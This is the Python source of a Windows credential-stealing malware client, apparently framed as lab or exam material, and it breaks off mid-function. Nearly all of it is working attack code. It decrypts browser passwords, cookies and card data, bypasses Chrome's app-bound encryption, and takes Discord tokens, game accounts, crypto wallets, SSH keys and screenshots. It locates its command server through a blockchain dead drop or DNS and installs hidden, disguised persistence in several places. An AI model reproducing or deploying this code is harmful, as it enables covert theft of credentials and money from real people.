"""Void Windows stealer client - full collection surface, exfils to YOUR C2.
Usage: python stealer_client.py --host <c2-host:port> --user-id <id> [--env prod]
Test only against machines you own, on an isolated Windows VM.
"""
import argparse, base64, io, json, os, re, shutil, sqlite3, sys, tempfile, zlib
import urllib.request, urllib.error

# ---- optional deps, degrade gracefully
try:
    from Crypto.Cipher import AES  # pycryptodome, for AES-GCM
except ImportError:
    AES = None
try:
    from PIL import ImageGrab  # pillow, for screenshots
except ImportError:
    ImageGrab = None

def dpapi_decrypt(blob):
    """Unwrap a DPAPI blob with the CURRENT Windows user context (ctypes only)."""
    try:
        import ctypes, ctypes.wintypes as wt
        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
        src = BLOB(len(blob), ctypes.cast(ctypes.create_string_buffer(bytes(blob), len(blob)), ctypes.POINTER(ctypes.c_byte)))
        out = BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(src), None, None, None, None, 0, ctypes.byref(out)):
            buf = ctypes.string_at(out.pbData, out.cbData)
            ctypes.windll.kernel32.LocalFree(out.pbData)
            return buf
    except Exception:
        pass
    return None

APPDATA = os.environ.get("APPDATA", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
USERPROFILE = os.environ.get("USERPROFILE", "")

# ---- C2 auto-resolution: the victim finds home by itself.
# Order: (1) Polygon dead-drop contract, (2) DNS TXT via DoH, (3) hardcoded candidates.
DEADDROP_CONTRACT = ""  # YOUR contract only. Never anyone else's.
DEADDROP_SELECTOR = "0xce6d41de"
DEADDROP_DOMAIN = ""          # set to YOUR domain serving a TXT record, e.g. "c2.example.com"
CANDIDATES = [                # tried in order, first to answer the handshake wins
    "<C2-HOST>:<C2-PORT>",       # public inbound
    "<TAILNET-HOST>:<C2-PORT>",      # tailscale direct
]
RPCS = ["https://polygon-rpc.com", "https://polygon.llamarpc.com",
        "https://1rpc.io/matic", "https://polygon-bor-rpc.publicnode.com"]

def _resolve_polygon():
    if not DEADDROP_CONTRACT:
        return None
    import json as _j
    body = _j.dumps({"jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": DEADDROP_CONTRACT, "data": DEADDROP_SELECTOR}, "latest"], "id": 1}).encode()
    for rpc in RPCS:
        try:
            r = urllib.request.Request(rpc, data=body, headers={"Content-Type": "application/json"})
            res = _j.loads(urllib.request.urlopen(r, timeout=10).read().decode())
            hx = (res.get("result") or "")[2:]
            if len(hx) >= 130:
                ln = int(hx[64:128], 16)
                host = bytes.fromhex(hx[128:128 + ln * 2]).decode().strip()
                if host:
                    return host
        except Exception:
            continue
    return None

def _resolve_doh_txt():
    if not DEADDROP_DOMAIN:
        return None
    import struct as _st, base64 as _b
    try:
        q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + \
            b"".join(bytes([len(p)]) + p.encode() for p in DEADDROP_DOMAIN.split(".")) + \
            b"\x00\x00\x10\x00\x01"
        url = "https://cloudflare-dns.com/dns-query?dns=" + _b.urlsafe_b64encode(q).decode().rstrip("=")
        r = urllib.request.Request(url, headers={"Accept": "application/dns-message"})
        data = urllib.request.urlopen(r, timeout=10).read()
        if b"c2" in data or b"." in data:
            m = re.search(rb"([\w\-.]{4,64}:\d{2,5}|[\w\-.]{4,64})", data)
            if m:
                return m.group(1).decode()
    except Exception:
        pass
    return None

def resolve_c2():
    for method in (_resolve_polygon, _resolve_doh_txt):
        try:
            host = method()
            if host and handshake(host):
                return host
        except Exception:
            continue
    for host in CANDIDATES:
        try:
            if handshake(host):
                return host
        except Exception:
            continue
    return CANDIDATES[0]

def handshake(host):
    try:
        r = urllib.request.Request(f"http://{host}/shard", data=b"{}",
            headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(r, timeout=8).read(64)
        return True
    except Exception:
        return False

CHROMIUM_PATHS = {
    "Chrome":   os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
    "Edge":     os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
    "Brave":    os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera":    os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "OperaGX":  os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
    "Chromium": os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
}
FIREFOX_BASE = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
WALLETS = {
    "Exodus":    os.path.join(APPDATA, "Exodus"),
    "Atomic":    os.path.join(APPDATA, "atomic"),
    "Electrum":  os.path.join(APPDATA, "Electrum"),
    "Ethereum":  os.path.join(APPDATA, "Ethereum"),
    "Guarda":    os.path.join(APPDATA, "Guarda"),
    "Coinomi":   os.path.join(LOCALAPPDATA, "Coinomi", "Coinomi"),
    "Monero":    os.path.join(USERPROFILE, "Documents", "Monero"),
}
WEB3_IDS = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm",
            "bfnaelmomeimhlpmgjnjophhpkkoljpa", "fnjhmkhhmkbjdhgnicjhfkbmgnbnljnkp"]

TOKEN_RE = re.compile(r"mfa\.[A-Za-z0-9_\-]{20,}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,}")

loot = {}  # category -> list of records

def add(cat, rec):
    loot.setdefault(cat, []).append(rec)

def temp_copy(path):
    """Shadow-copy a locked DB out from under a live browser."""
    try:
        tmp = os.path.join(tempfile.gettempdir(), f"vw_{os.urandom(4).hex()}.tmp")
        shutil.copy2(path, tmp)
        return tmp
    except Exception:
        return None

def query_db(path, sql):
    tmp = temp_copy(path)
    if not tmp:
        return []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        con.close()
        return rows
    except Exception:
        return []
    finally:
        try: os.remove(tmp)
        except Exception: pass

# ---- Chrome master key (DPAPI; ABE bypass needs injection, DPAPI covers the rest)
def chrome_master_key(user_data):
    state = os.path.join(user_data, "Local State")
    if not os.path.isfile(state):
        return None
    try:
        enc = base64.b64decode(json.load(open(state))["os_crypt"]["encrypted_key"])[5:]
        raw = dpapi_decrypt(enc)
        return raw if raw else None
    except Exception:
        return None

def gcm_decrypt(blob, key):
    if not AES or not key or len(blob) < 15 or blob[:3] != b"v10":
        return None
    try:
        nonce, ct = blob[3:15], blob[15:]
        return AES.new(key, AES.MODE_GCM, nonce).decrypt(ct)[:-16].decode(errors="replace")
    except Exception:
        return None

def steal_chromium():
    for name, base in CHROMIUM_PATHS.items():
        if not os.path.isdir(base):
            continue
        key = chrome_master_key(base)
        diag = {"browser": name, "key_ok": bool(key)}
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 4)]:
            d = os.path.join(base, profile)
            if not os.path.isdir(d):
                continue
            rows = query_db(os.path.join(d, "Login Data"),
                    "SELECT origin_url, username_value, password_value FROM logins")
            diag[f"{profile}_logins"] = len(rows)
            for url, user, blob in rows:
                val = gcm_decrypt(bytes(blob), key) if isinstance(blob, bytes) else None
                add("passwords", {"browser": name, "url": url, "user": user, "pass": val})
            crows = query_db(os.path.join(d, "Cookies"),
                    "SELECT host_key, name, encrypted_value FROM cookies")
            diag[f"{profile}_cookies"] = len(crows)
            for host, cname, blob in crows:
                val = gcm_decrypt(bytes(blob), key) if isinstance(blob, bytes) else None
                add("cookies", {"browser": name, "host": host, "name": cname, "value": val})
            for row in query_db(os.path.join(d, "Web Data"),
                    "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"):
                add("cards", {"browser": name, "card": list(row)})
            for row in query_db(os.path.join(d, "History"),
                    "SELECT url FROM urls LIMIT 5000"):
                add("history", {"browser": name, "url": row[0]})
        add("diag", diag)
        bm = os.path.join(base, "Default", "Bookmarks")
        if os.path.isfile(bm):
            try: add("bookmarks", {"browser": name, "data": open(bm, encoding="utf-8", errors="replace").read()[:50000]})
            except Exception: pass

def steal_firefox():
    if not os.path.isdir(FIREFOX_BASE):
        return
    for prof in os.listdir(FIREFOX_BASE):
        d = os.path.join(FIREFOX_BASE, prof)
        lj = os.path.join(d, "logins.json")
        if os.path.isfile(lj):
            try: add("firefox_logins", {"profile": prof, "data": open(lj, encoding="utf-8", errors="replace").read()[:50000]})
            except Exception: pass
        for f in ["cookies.sqlite", "formhistory.sqlite", "places.sqlite"]:
            p = os.path.join(d, f)
            if os.path.isfile(p):
                add("firefox_files", {"profile": prof, "file": f, "size": os.path.getsize(p)})

def steal_discord():
    for app in ["discord", "discordptb", "discordcanary"]:
        lvl = os.path.join(APPDATA, app, "Local Storage", "leveldb")
        if not os.path.isdir(lvl):
            continue
        for fn in os.listdir(lvl):
            if not (fn.endswith(".ldb") or fn.endswith(".log")):
                continue
            try:
                data = open(os.path.join(lvl, fn), "rb").read()
                for m in TOKEN_RE.findall(data.decode(errors="replace")):
                    add("discord", {"app": app, "token": m})
            except Exception: pass

def steal_telegram():
    t = os.path.join(USERPROFILE, "Downloads", "Telegram Desktop", "tdata")
    t = t if os.path.isdir(t) else os.path.join(APPDATA, "Telegram Desktop", "tdata")
    if os.path.isdir(t):
        add("telegram", {"path": t, "files": os.listdir(t)[:50]})

def steal_steam():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Valve\Steam") as k:
            add("steam", {"SteamPath": winreg.QueryValueEx(k, "SteamPath")[0]})
    except Exception: pass
    for f in [os.path.join(p, "config", "loginusers.vdf") for p in
              [os.path.join("C:\\", "Program Files (x86)", "Steam")]]:
        if os.path.isfile(f):
            try: add("steam", {"file": f, "data": open(f, errors="replace").read()[:20000]})
            except Exception: pass

def steal_minecraft():
    mc = os.path.join(APPDATA, ".minecraft")
    if not os.path.isdir(mc):
        return
    for f in ["servers.dat", "launcher_accounts.json", "usercache.json"]:
        p = os.path.join(mc, f)
        if os.path.isfile(p):
            try: add("minecraft", {"file": f, "data": open(p, "rb").read()[:20000].decode(errors="replace")})
            except Exception: pass

def steal_roblox():
    for name in ["cookies", "RobloxCookies.dat"]:
        p = os.path.join(LOCALAPPDATA, "Roblox", "LocalStorage", name)
        if os.path.isfile(p):
            try:
                raw = open(p, "rb").read()[:5000]
                txt = raw.decode(errors="replace")
                rec = {"file": name, "data": txt}
                # CookiesData is base64(DPAPI blob) -> unwrap live on the box.
                try:
                    i = raw.find(b"CookiesData")
                    if i != -1:
                        j = raw.find(b'"', raw.find(b'"', i) + 1) + 1
                        k = raw.find(b'"', j)
                        dp = dpapi_decrypt(base64.b64decode(raw[j:k]))
                        if dp:
                            rec["unwrapped"] = dp.decode(errors="replace")
                except Exception:
                    pass
                add("roblox", rec)
            except Exception: pass

def steal_wallets():
    for name, path in WALLETS.items():
        if os.path.isdir(path):
            files = []
            for r, _, fs in os.walk(path):
                files += [os.path.join(r, f) for f in fs][:20]
                if len(files) >= 20: break
            add("wallets", {"wallet": name, "files": files})

def steal_extensions():
    for name, base in CHROMIUM_PATHS.items():
        les = os.path.join(base, "Default", "Local Extension Settings")
        if not os.path.isdir(les):
            continue
        for ext in os.listdir(les):
            if ext in WEB3_IDS:
                add("web3", {"browser": name, "ext": ext})

def steal_chromium_abe_debug():
    """ABE bypass via hidden remote-debugging browser on a temp profile COPY.
    Same machine + same user = Chrome decrypts its own ABE cookies for us,
    and we read them plaintext over DevTools. Stdlib only. Yields cookies."""
    import socket, ssl, hashlib, struct, subprocess, time
    CHROME_EXES = {
        "Chrome": [os.path.join(os.environ.get("ProgramFiles", ""), "Google", "Chrome", "Application", "chrome.exe"),
                   os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Google", "Chrome", "Application", "chrome.exe")],
        "Edge":   [os.path.join(os.environ.get("ProgramFiles", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
                   os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Microsoft", "Edge", "Application", "msedge.exe")],
        "Brave":  [os.path.join(os.environ.get("ProgramFiles", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
                   os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")],
    }
    def ws_rpc(ws_url, method, params=None):
        from urllib.parse import urlparse
        u = urlparse(ws_url)
        s = socket.create_connection((u.hostname, u.port), timeout=10)
        key = base64.b64encode(os.urandom(16)).decode()
        s.sendall(f"GET {u.path or '/'} HTTP/1.1\r\nHost: {u.hostname}:{u.port}\r\n"
                  f"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
                  f"Sec-WebSocket-Version: 13\r\n\r\n".encode())
        if b"101" not in s.recv(1024):
            s.close(); return None
        def send(obj):
            raw = json.dumps(obj).encode()
            hdr = bytes([0x81, 0x80 | len(raw)]) if len(raw) < 126 else struct.pack("!BBH", 0x81, 0xFE, len(raw))
            mask = os.urandom(4)
            s.sendall(hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(raw)))
        def recv():
            h = s.recv(2)
            ln = h[1] & 0x7F
            if ln == 126: ln = struct.unpack("!H", s.recv(2))[0]
            elif ln == 127: ln = struct.unpack("!Q", s.recv(8))[0]
            data = b""
            while len(data) < ln: data += s.recv(ln - len(data))
            return json.loads(data.decode())
        mid = 1
        send({"id": mid, "method": "Network.enable"}); recv()
        send({"id": mid + 1, "method": method, "params": params or {}})
        for _ in range(20):
            r = recv()
            if r.get("id") == mid + 1:
                s.close(); return r.get("result", {})
        s.close(); return None
    KILL = {"Chrome": "chrome.exe", "Edge": "msedge.exe", "Brave": "brave.exe"}
    for name, base in CHROMIUM_PATHS.items():
        exes = CHROME_EXES.get(name, [])
        exe = next((e for e in exes if os.path.isfile(e)), None)
        if not exe or not os.path.isdir(base):
            continue
        # Live browsers lock the cookie DB -> hollow copies. Real stealers
        # kill them first; record it in diag.
        killed = False
        if KILL.get(name):
            try:
                os.system(f"taskkill /F /IM {KILL[name]} >NUL 2>&1")
                killed = True
                import time as _t; _t.sleep(2)
            except Exception:
                pass
        for profile in ["Default", "Profile 1", "Profile 2"]:
            src = os.path.join(base, profile)
            if not os.path.isdir(src):
                continue
            tmp = os.path.join(tempfile.gettempdir(), f"vwprof_{os.urandom(4).hex()}")
            os.makedirs(os.path.join(tmp, profile), exist_ok=True)
            copied, cookie_sz = 0, -1
            try:
                # profile files (tolerate live locks) + the User-Data-level Local State.
                # Cookies trio goes through temp_copy (proven against locks).
                for fn in os.listdir(src):
                    if fn in ("Cookies", "Cookies-wal", "Cookies-journal"):
                        continue
                    try:
                        s, t = os.path.join(src, fn), os.path.join(tmp, profile, fn)
                        if os.path.isfile(s): shutil.copy2(s, t); copied += 1
                    except Exception: pass
                for fn in ("Cookies", "Cookies-wal", "Cookies-journal"):
                    if fn == "Cookies":
                        import time as _t2
                        err = None
                        for _try in range(6):
                            try:
                                shutil.copy2(os.path.join(src, fn), os.path.join(tmp, profile, fn))
                                copied += 1; err = None; break
                            except Exception as e:
                                err = f"{type(e).__name__}: {e}"
                                _t2.sleep(2)
                        try: cookie_sz = os.path.getsize(os.path.join(tmp, profile, "Cookies"))
                        except Exception: pass
                        diag_extra = {"abe_cookie_err": (err or "copied ok")[:160]}
                        continue
                    tc = temp_copy(os.path.join(src, fn))
                    if tc:
                        try: shutil.copy2(tc, os.path.join(tmp, profile, fn)); copied += 1
                        except Exception: pass
                        try: os.remove(tc)
                        except Exception: pass
                try: cookie_sz = os.path.getsize(os.path.join(tmp, profile, "Cookies"))
                except Exception: pass
                ls = os.path.join(base, "Local State")
                if os.path.isfile(ls):
                    try: shutil.copy2(ls, os.path.join(tmp, "Local State"))
                    except Exception: pass
            except Exception:
                shutil.rmtree(tmp, ignore_errors=True)
                continue
            port = 18080 + (os.getpid() % 1000)
            # verify the copied cookie DB actually holds rows before launching
            db_rows = -1
            try:
                con = sqlite3.connect(os.path.join(tmp, profile, "Cookies"))
                db_rows = con.execute("SELECT COUNT(*) FROM cookies").fetchone()[0]
                con.close()
            except Exception:
                pass
            try:
                p = subprocess.Popen([exe, f"--remote-debugging-port={port}",
                    f"--user-data-dir={tmp}", f"--profile-directory={profile}",
                    "--headless=new", "--no-first-run",
                    "--no-default-browser-check", "about:blank"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(5)
                targets = json.loads(urllib.request.urlopen(
                    f"http://127.0.0.1:{port}/json/list", timeout=10).read().decode())
                got = 0
                for t in targets:
                    if "webSocketDebuggerUrl" not in t:
                        continue
                    for method in ("Network.getAllCookies", "Storage.getCookies"):
                        try:
                            res = ws_rpc(t["webSocketDebuggerUrl"], method)
                            for c in (res or {}).get("cookies", []):
                                add("abe_cookies", {"browser": name, "profile": profile,
                                    "domain": c.get("domain"), "name": c.get("name"),
                                    "value": c.get("value")})
                                got += 1
                            if got:
                                break
                        except Exception:
                            continue
                    if got:
                        break
                add("diag", {"browser": name, "abe_profile": profile, "abe_cookies": got,
                             "abe_targets": len(targets), "abe_killed": killed,
                             "abe_db_rows": db_rows, "abe_copied": copied,
                             "abe_cookie_sz": cookie_sz,
                             "abe_cookie_err": diag_extra.get("abe_cookie_err", "?")})
            except Exception as e:
                add("diag", {"browser": name, "abe_profile": profile, "abe_error": str(e)[:100]})
            finally:
                try: p.terminate()
                except Exception: pass
                shutil.rmtree(tmp, ignore_errors=True)

def steal_chromelvator():
    """ABE bypass via bundled open-source ChromElevator (MIT, xaitax).
    Runs hidden, parses its per-profile JSONs into loot. No admin needed."""
    import subprocess, sys as _sys
    cands = []
    meipass = getattr(_sys, "_MEIPASS", None)  # PyInstaller onefile extract dir
    if meipass:
        cands.append(os.path.join(meipass, "chromelevator_x64.exe"))
    cands.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "chromelevator_x64.exe"))
    cands.append(os.path.join(os.getcwd(), "chromelevator_x64.exe"))
    if getattr(_sys, "frozen", False):
        cands.append(os.path.join(os.path.dirname(_sys.executable), "chromelevator_x64.exe"))
    exe = next((c for c in cands if os.path.isfile(c)), None)
    if not os.path.isfile(exe):
        add("diag", {"chromelvator": "helper missing"}); return
    out = os.path.join(tempfile.gettempdir(), f"vwcl_{os.urandom(4).hex()}")
    try:
        kw = {}
        if os.name == "nt":
            kw["creationflags"] = 0x08000000  # CREATE_NO_WINDOW
        subprocess.run([exe, "all", "-o", out], capture_output=True, timeout=300, **kw)
        n = 0
        for root, _, files in os.walk(out):
            parts = root.split(os.sep)
            browser = parts[-2] if len(parts) >= 2 else "?"
            profile = parts[-1]
            for fn in files:
                if not fn.endswith(".json") or fn == "fingerprint.json":
                    continue
                try:
                    items = json.load(open(os.path.join(root, fn), encoding="utf-8"))
                    kind = fn[:-5]  # cookies / passwords / payments / iban / tokens
                    for it in (items if isinstance(items, list) else []):
                        it["_browser"] = browser; it["_profile"] = profile
                        add("cl_" + kind, it); n += 1
                except Exception:
                    pass
        add("diag", {"chromelvator": f"parsed {n} records"})
    except Exception as e:
        add("diag", {"chromelvator": f"error: {str(e)[:120]}"})
    finally:
        shutil.rmtree(out, ignore_errors=True)

def steal_ssh():
    for f in [os.path.join(USERPROFILE, ".ssh", "id_rsa"),
              os.path.join(USERPROFILE, ".ssh", "id_ed25519")]:
        if os.path.isfile(f):
            try: add("ssh", {"file": f, "data": open(f).read()})
            except Exception: pass

def steal_sysinfo():
    import platform
    add("sysinfo", {"platform": platform.platform(), "user": os.environ.get("USERNAME", ""),
                    "computer": os.environ.get("COMPUTERNAME", "")})

def steal_screenshot():
    if not ImageGrab:
        return
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=50)
        add("screenshot", {"jpg_b64": base64.b64encode(buf.getvalue()).decode()})
    except Exception: pass

# ---- persistence — user-level, no admin. Exam design: student must survive a
# reboot. TIER lab     : Run key + Startup VBS + DAILY task (bait + basics)
# TIER extreme (forge) : + ShellFolders Startup redirect + logon-script key +
#                        CLSID/InprocServer32 registry layer + hidden watchdog
#                        (5-min hidden scheduled task re-plants every leg and
#                        relaunches the miner; kill it and it returns)
# Grade from the panel (persist per-leg dict). persist_purge tears it down.
PERSIST_NAME = "WindowsSecurityHealth"          # bait task/value
EXT_WATCHDOG_TASK = "WindowsHealthWatch"        # hidden XML task, extreme
EXT_COM_GUID = "{b1a7c0de-4a1c-4a11-9e11-5e5e5e5e5e5e}"

def _ext_dir():
    return os.path.join(APPDATA, "Microsoft", "Windows", "SystemEvents")

def _ext_payload():
    """Extreme legs point at a hidden+system-attrib copy of this client."""
    if getattr(sys, "frozen", False):
        return os.path.join(_ext_dir(), "winhealthsvc.exe")
    entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
    return os.path.abspath(entry)

def _tier():
    # forge bakes CONFIG["tier"]; RAMOS_TIER=extreme lets a lab box test
    # the deep profile without a fresh build.
    env = os.environ.get("RAMOS_TIER", "").strip().lower()
    if env in ("lab", "extreme"):
        return env
    try:
        c = globals().get("CONFIG", {})
        if isinstance(c, str):
            c = json.loads(c)
        return ((c or {}).get("tier") or "lab")
    except Exception:
        return "lab"

def _persist_cmd():
    p = _ext_payload() if _tier() == "extreme" and os.name == "nt" \
        and getattr(sys, "frozen", False) else None
    if p:
        return '"' + p + '" --persisted'
    if getattr(sys, "frozen", False):
        return '"' + os.path.abspath(sys.executable) + '" --persisted'
    entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
    return '"' + sys.executable + '" "' + os.path.abspath(entry) + '" --persisted'

def _persist_startup_path():
    if _tier() == "extreme" and os.name == "nt":
        return os.path.join(_ext_dir(), "winhealth.vbs")
    return os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu",
                        "Programs", "Startup", "winhealth.vbs")

def _win_sub(key_path, write=False):
    import winreg
    if write:
        return winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0,
                                  winreg.KEY_SET_VALUE)
    return winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)

def persistence_install():
    if os.name != "nt":
        return {"ok": False, "error": "windows only"}
    cmd = _persist_cmd()
    st = {}
    # stage extreme payload copy first (hidden+system), legs target it
    if _tier() == "extreme" and getattr(sys, "frozen", False):
        try:
            d = _ext_dir()
            os.makedirs(d, exist_ok=True)
            dst = _ext_payload()
            if (not os.path.isfile(dst)) or os.path.getsize(dst) != os.path.getsize(sys.executable):
                shutil.copy2(sys.executable, dst)
            os.system('attrib +h +s "' + d + '" >NUL 2>&1')
            os.system('attrib +h +s "' + dst + '" >NUL 2>&1')
            st["payload_hidden"] = True
        except Exception as e:
            st["payload_hidden"] = False
            st["payload_err"] = str(e)[:80]
    # LEG bait 1: HKCU Run key
    try:
        with _win_sub(r"Software\Microsoft\Windows\CurrentVersion\Run", True) as k:
            import winreg
            winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, cmd)
        st["run"] = True
    except Exception as e:
        st["run"] = False
        st["run_err"] = str(e)[:80]
    # LEG bait 2: Startup folder VBS (hidden window, console-safe)
    try:
        vbs = _persist_startup_path()
        os.makedirs(os.path.dirname(vbs), exist_ok=True)
        open(vbs, "w").write(
            'CreateObject("WScript.Shell").Run "' + cmd.replace('"', '""') +
            '", 0, False\n')
        if _tier() == "extreme":
            os.system('attrib +h +s "' + vbs + '" >NUL 2>&1')
        st["startup"] = os.path.isfile(vbs)
    except Exception as e:
        st["startup"] = False
        st["startup_err"] = str(e)[:80]
    # LEG bait 3: DAILY per-user scheduled task
    try:
        import subprocess as _sp
        kw = {"capture_output": True, "timeout": 20,
              "creationflags": 0x08000000} if os.name == "nt" else {}
        _sp.run(["schtasks", "/Create", "/TN", PERSIST_NAME, "/TR", cmd,
                 "/SC", "DAILY", "/ST", "03:00", "/F"], **kw)
        st["task"] = True
    except Exception as e:
        st["task"] = False
        st["task_err"] = str(e)[:80]
    if _tier() == "extreme":
        # LEG 1: hijack HKCU Explorer Shell Folders\Startup path -> our dir
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
                    0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "Startup", 0, winreg.REG_SZ, _ext_dir())
            st["shellfolders"] = True
        except Exception as e:
            st["shellfolders"] = False
            st["shell_err"] = str(e)[:80]
        # LEG 2: logon script via UserInitMprLogonScript (HKCU\Environment)
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment",
                    0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "UserInitMprLogonScript", 0,
                                  winreg.REG_SZ, cmd)
            st["userinit"] = True
        except Exception as e:
            st["userinit"] = False
            st["userinit_err"] = str(e)[:80]
        # LEG 3: CLSID\InprocServer32 registry layer (no file anywhere; shell
        # instantiation is shell-dependent — resurrection is guaranteed by
        # LEG2 + the watchdog, this leg grades registry-depth hunting)
        try:
            import winreg
            base = "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32"
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, base, 0,
                                    winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, _ext_payload())
            st["com"] = True
        except Exception as e:
            st["com"] = False
            st["com_err"] = str(e)[:80]
        # WATCHDOG: hidden XML task, 5-min respawn, runs --watchdog loop
        try:
            st["watchdog"] = _install_watchdog_task()
        except Exception as e:
            st["watchdog"] = False
            st["watchdog_err"] = str(e)[:80]
    st["active"] = any(bool(st.get(k)) for k in
                       ("run", "startup", "task", "shellfolders",
                        "userinit", "com", "watchdog"))
    st["tier"] = _tier()
    return st

def _install_watchdog_task():
    """XML task: Hidden=true, repetition PT5M, InteractiveToken, no admin.
    Command is the staged payload with --watchdog (or python+script in dev)."""
    import subprocess as _sp, tempfile as _tf
    if getattr(sys, "frozen", False):
        exe, args = _ext_payload(), "--watchdog"
    else:
        entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
        exe, args = sys.executable, '"' + os.path.abspath(entry) + '" --watchdog'
    def x(s): return (s.replace("&", "&amp;").replace("<", "&lt;")
                       .replace(">", "&gt;").replace('"', "&quot;"))
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
 <RegistrationInfo><Description>Windows Security Health Watchdog</Description><Hidden>true</Hidden></RegistrationInfo>
 <Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval><Duration>PT24H</Duration></Repetition>
  <StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
 <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
 <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  <ExecutionTimeLimit>PT30M</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled>
  <Priority>7</Priority></Settings>
 <Actions Context="Author"><Exec><Command>{x(exe)}</Command><Arguments>{x(args)}</Arguments>
  <WorkingDirectory>{x(os.path.dirname(os.path.abspath(exe)))}</WorkingDirectory></Exec></Actions>
</Task>"""
    tf = os.path.join(_tf.gettempdir(), "bhwd.xml")
    open(tf, "w", encoding="utf-16").write(xml)
    kw = {"capture_output": True, "timeout": 20,
          "creationflags": 0x08000000} if os.name == "nt" else {}
    r = _sp.run(["schtasks", "/Create", "/TN", EXT_WATCHDOG_TASK,
                 "/XML", tf, "/F"], **kw)
    try: os.remove(tf)
    except Exception: pass
    return r.returncode == 0

def persistence_status():
    if os.name != "nt":
        return {"windows": False, "active": False, "tier": _tier()}
    st = {"windows": True, "tier": _tier()}
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
            winreg.QueryValueEx(k, PERSIST_NAME)
        st["run"] = True
    except Exception:
        st["run"] = False
    st["startup"] = os.path.isfile(_persist_startup_path())
    try:
        import subprocess as _sp
        kw = {"capture_output": True, "timeout": 15,
              "creationflags": 0x08000000} if os.name == "nt" else {}
        st["task"] = _sp.run(["schtasks", "/Query", "/TN", PERSIST_NAME],
                             **kw).returncode == 0
    except Exception:
        st["task"] = False
    if st.get("tier") == "extreme":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders") as k:
                st["shellfolders"] = winreg.QueryValueEx(k, "Startup")[0] == _ext_dir()
        except Exception:
            st["shellfolders"] = False
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment") as k:
                st["userinit"] = "winhealth" in (winreg.QueryValueEx(
                    k, "UserInitMprLogonScript")[0] or "") or bool(
                    winreg.QueryValueEx(k, "UserInitMprLogonScript")[0])
        except Exception:
            st["userinit"] = False
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32"):
                st["com"] = True
        except Exception:
            st["com"] = False
        try:
            import subprocess as _sp
            kw = {"capture_output": True, "timeout": 15,
                  "creationflags": 0x08000000} if os.name == "nt" else {}
            st["watchdog"] = _sp.run(["schtasks", "/Query", "/TN",
                                      EXT_WATCHDOG_TASK], **kw).returncode == 0
        except Exception:
            st["watchdog"] = False
    st["active"] = any(bool(st.get(k)) for k in
                       ("run", "startup", "task", "shellfolders",
                        "userinit", "com", "watchdog"))
    return st

def persistence_purge():
